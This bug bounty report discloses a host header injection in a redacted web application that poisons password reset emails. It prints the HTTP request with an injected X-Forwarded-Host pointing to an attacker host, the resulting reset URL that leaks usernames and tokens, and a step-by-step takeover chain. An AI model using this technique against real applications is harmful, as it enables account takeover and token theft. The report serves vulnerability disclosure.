Host Header Injection leading to 0-Click Account Takeover

BOUNTY-DEX Vulnerability Report

Type: Host Header Injection / Password Reset Poisoning

CRITICAL

Summary

The target application trusted user-controlled host-related headers when generating absolute links. By injecting X-Forwarded-Host, an attacker could force password reset emails to contain attacker-controlled domains while preserving valid reset tokens in the URL. During testing, requests to the poisoned reset link were received even without explicit victim clicks, resulting in a practical 0-click account takeover scenario.

Technical Details

The web application builds links using host values influenced by proxy headers. Injecting X-Forwarded-Host changed the base domain for generated links across the application.

Request:

GET /index.php/fd/login HTTP/2
Host: XX.YY.redacted.es
X-Forwarded-Host: attacker-domain.oastify.com

Response:

Now all the links are poisoned with the attacker's domain

<link rel="icon" href="https://attacker-domain.oastify.com/XXX/XXX/2/XXX.png" />
<link rel="stylesheet" href="https://attacker-domain.oastify.com/YYY/YYY/YYY/YYY/YYY.css?v=3.3.0.21" />

This issue becomes critical in the password reset flow. If the attacker triggers a reset for a valid user and injects X-Forwarded-Host, the email sent to the user includes an attacker-controlled reset URL base.

Reset url sent via email:

https://attacker-domain.oastify.com/index.php/fd/login/resetPassword/[username]?confirm=[reset_token]

Exploitation Chain

  1. Attacker submits password reset for victim email.
  2. Attacker injects X-Forwarded-Host: attacker-domain.oastify.com.
  3. Application sends reset email containing a link with attacker domain + valid reset token.
  4. Any access to that link leaks token and username to attacker infrastructure.
  5. Attacker uses leaked data to reset victim password and take over the account.

0-Click Behavior Observed

During testing, inbound requests to the poisoned reset URL were received without manual user interaction. This indicates link prefetching/scanning by mail security systems or automated clients. As a result, token leakage can occur even if the victim never clicks the email.

Impact

  • Account takeover via password reset token theft.
  • 0-click token exfiltration when email scanners/bots request reset links automatically.
  • Potential compromise of any account for which a reset can be triggered.
